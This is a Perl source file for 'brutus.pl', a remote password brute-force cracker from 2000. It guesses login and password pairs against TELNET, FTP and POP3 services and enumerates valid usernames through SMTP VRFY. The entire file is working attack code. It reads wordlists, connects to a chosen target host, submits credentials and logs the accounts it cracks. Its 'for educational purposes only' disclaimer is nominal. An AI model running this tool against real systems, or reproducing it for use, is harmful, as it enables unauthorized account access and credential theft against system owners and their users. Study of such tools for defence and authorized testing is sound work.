#!/usr/bin/perl

#
# $Id$
#
# brutus.pl v0.5 - remote bruteforce cracker
# Copyright (c) 2000 Raptor <raptor@antifork.org>
#
# This program tries to break in remotely using password bruteforcing
# for TELNET, FTP and POP3 (feel free to add support for other protocols).
# Login list generation through SMTP vrfy bruteforcing is also supported.
# It uses Net::Telnet Perl module (get it at CPAN modules/by-module/Net/).
# Written in one night, using one hand (other arm is broken). pHEAR.
#
# FOR EDUCATIONAL PURPOSES ONLY (tm).
#


# Modules
use Net::Telnet;
use Getopt::Std;

# Default vars
$author = "Raptor <raptor\@antifork.org>";
$version = "v0.5";
$usage = "\nbrutus.pl $version by $author\n\nUsage: brutus.pl -h host -l llist [-p plist] [-s service] [-t timeout] [-L log]\n\nhost\t: specifies target host (numeric or resolved address)\nllist\t: login list file (or login/password file for single mode)\nplist\t: password list file (enter single mode if not supplied)\nservice\t: type of service (telnet, ftp, pop3 or smtp), default is telnet\ntimeout\t: specifies connection timeout, default is 10 secs\nlog\t: specifies the optional log file\n\n";
$timeout = 10;
$service = "telnet";
$l = 0; # login counter
$p = 0; # password counter
$v = 0; # valid counter
chomp($date = `date "+%m/%d, %H:%M:%S"`);

# Command line
getopt("h:l:p:t:s:L:");
die $usage if (!($opt_h) || !($opt_l)); # mandatory options
$target = $opt_h;
$lfile = $opt_l;
$pfile = $opt_p;
$logfile = $opt_L;
$timeout = $opt_t if $opt_t;
$service = $opt_s if $opt_s;

die "err: $lfile: no such file\n" if !(open LOGIN, "<$lfile"); 


# Print start info to stdout/logfile
$start = "\n\n---Breaking on $target $service started at $date---\n";
print $start;
if ($logfile) {
	die "err: $logfile: error writing to file\n" 
		if !(open LOG, ">>$logfile");
	print LOG $start;
	select(LOG); # flush log output
	$| = 1;
	select(STDOUT);
}


# Double mode (check every password for each login)
if ($pfile) {
	$i = 0;
	die "err: $pfile: no such file\n" if !(open PASSW, "<$pfile"); 
	while (<PASSW>) {
		chomp($plist[$i] = $_);
		$i++;
	}
	close PASSW;
	while (<LOGIN>) {
		next if $_ eq "\n"; # skip empty login
		chomp($login = $_);
		$l++;
		foreach $password (@plist) {
			$p++;
			if ($service eq "ftp") {
				&scan_ftp("21");
			} elsif ($service eq "pop3") {
				&scan_pop3("110");
			} elsif ($service eq "smtp") {
				die "err: double mode not supported with protocol SMTP\n";	
			} elsif ($service eq "telnet") {
				&scan_telnet("23");
			} else {
				die "err: protocol $service not currently supported\n";
			}
		}
	}


# Single mode (test equal password/login pairs)
} else {
	while (<LOGIN>) {
		next if $_ eq "\n"; # skip empty login
		chomp($login = $_);
		chomp($password = $login);
		$l++; $p++;
		if ($service eq "ftp") {
			&scan_ftp("21");
		} elsif ($service eq "pop3") {
			&scan_pop3("110");
		} elsif ($service eq "smtp") {
			&scan_smtp("25");	
		} elsif ($service eq "telnet") {	
			&scan_telnet("23");
		} else {
			die "err: protocol $service not currently supported\n";
		}
	}
}

close LOGIN;


# Print end info to stdout/logfile
chomp($date = `date "+%m/%d, %H:%M:%S"`);
$total = "\n[T]  $l login(s) and $p password(s) totally tested, $v account(s) found\n";
$total = "\n[T]  $l login(s) totally tested, $v existant login(s) found\n" if $service eq "smtp";
$end = "--- Breaking on $target $service ended at $date ---\n";
print $total;
print $end;
if ($logfile) {
	print LOG $total;
	print LOG $end;
	close LOG;
}
exit(0);


#################### Local Functions #######################


# Logging routine
sub log {
	# Valid account found!
	if ($gotcha) {
		$v++;
		$ok = "[x]  $login:$password is a VALID $service account for $target!\n";
		print $ok;
		print LOG $ok if $logfile;
	
	# Account is not good
	} else {
		$ko = "[ ]  $login:$password is not good, moving on...\n";
		print $ko;
		print LOG $ko if $logfile;
	}

	return;
}


# SMTP vrfy logging routine
sub log_smtp {
	# Valid login found!
	if ($gotcha) {
		$v++;
		$ok = "$login\n";
		print $ok;
		print LOG $ok if $logfile;
	}
	return;
}


# TELNET bruteforcer (default)
sub scan_telnet {

	# Connect to target
	$t = new Net::Telnet (	
		Port => $_[0],
		Host => $target,
		Timeout => $timeout,
		Errmode => "return");
	die "err: can't connect\n" if !$t;

	# Wait for prompt and send data
	$t->waitfor(-match => '/login[: ]*$/i', 
		-match => '/username[: ]*$/i');
	$t->print($login);
	$gotcha = 1;
	$t->waitfor('/password[: ]*$/i');
	$t->print($password);

	# Determine wether the account is valid or not
	(undef, $match) = $t->waitfor(-match => '/login[: ]*$/i',
		-match => '/username[: ]$/i', -match => '/[\$%#>] $/');
	$gotcha = 0 if $match =~ /login[: ]*$/i or /Login incorrect/;
	$gotcha = -1 if !($match =~ /[\$%#>] $/) and $gotcha;

	# Error handling
	if ($gotcha == -1) {
		$t->close;
		&scan_telnet($_[0]);
		return;
	}
	
	# Log results	
	&log;

	$t->close;
	return;
}


# FTP bruteforcer
sub scan_ftp {

	# Connect to target
	$t = new Net::Telnet (	
		Port => $_[0],
		Host => $target,
		Timeout => $timeout,
		Errmode => "return");
	die "err: can't connect\n" if !$t;

	# Wait for prompt and send data
	$match = $t->getline;
	do {} until ($match =~ /^220/);
	$t->print("USER $login");
	$gotcha = 1;
	$match = $t->getline;
	do {} until (($match =~ /^331/) || ($match =~ /^530/)) ;
	# Handle login disabling feature (mostly root accounts)
	if ($match =~ !/^530/) {
		$t->print("PASS $password");

		# Determine wether the account is valid or not
		$match = $t->getline;
	}
	$gotcha = 0 if $match =~ /^530/;
	$gotcha = -1 if !($match =~ /^230/) and $gotcha;

	# Error handling
	if ($gotcha == -1) {
		$t->close;
		&scan_ftp($_[0]);
		return;
	}
	
	# Log results	
	&log;

	$t->close;
	return;
}


# POP3 bruteforcer
sub scan_pop3 {

	# Connect to target
	$t = new Net::Telnet (	
		Port => $_[0],
		Host => $target,
		Timeout => $timeout,
		Errmode => "return");
	die "err: can't connect\n" if !$t;

	# Wait for prompt and send data
	$match = $t->getline;
	do {} until ($match =~ /^\+OK/);
	$t->print("USER $login");
	$gotcha = 1;
	$match = $t->getline;
	do {} until ($match =~ /^\+OK/);
	$t->print("PASS $password");

	# Determine wether the account is valid or not
	$match = $t->getline;
	$gotcha = 0 if $match =~ /^\-ERR/;
	$gotcha = -1 if !($match =~ /^\+OK/) and $gotcha;

	# Error handling
	if ($gotcha == -1) {
		$t->close;
		&scan_pop3($_[0]);
		return;
	}
	
	# Log results	
	&log;

	$t->close;
	return;
}


# SMTP bruteforcer
sub scan_smtp {

	# Connect to target
	$t = new Net::Telnet (	
		Port => $_[0],
		Host => $target,
		Timeout => $timeout,
		Errmode => "return");
	die "err: can't connect\n" if !$t;

	# Wait for prompt and send data
	$match = $t->getline;
	do {} until ($match =~ /^220/);
	$t->print("VRFY $login");
	$gotcha = 1;

	# Determine wether the login exists or not
	$match = $t->getline;
	$gotcha = 0 if $match =~ /^550/;
	$gotcha = -1 if !($match =~ /^250/) and $gotcha;

	# Error handling
	if ($gotcha == -1) {
		$t->close;
		&scan_smtp($_[0]);
		return;
	}
	
	# Log results	
	&log_smtp;

	$t->close;
	return;
}
